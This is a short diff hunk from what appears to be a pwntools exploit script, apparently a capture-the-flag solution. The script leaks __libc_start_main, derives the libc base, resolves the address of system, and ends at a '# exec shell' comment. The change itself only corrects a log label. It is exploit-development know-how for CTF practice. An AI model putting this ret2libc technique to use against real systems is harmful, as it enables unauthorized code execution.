@@ -52,7 +52,7 @@ log.info("__libc_start_main+231: 0x{:08x}".format(leak))
 libc_base = leak - libc.symbols['__libc_start_main'] - 231
 log.info("libc base: 0x{:08x}".format(libc_base))
 libc_system = libc_base + libc.symbols['system']
-log.info("libc base: 0x{:08x}".format(libc_system))
+log.info("system@libc: 0x{:08x}".format(libc_system))
 p.recvuntil("value:")
 p.send(b'\n')
 # exec shell
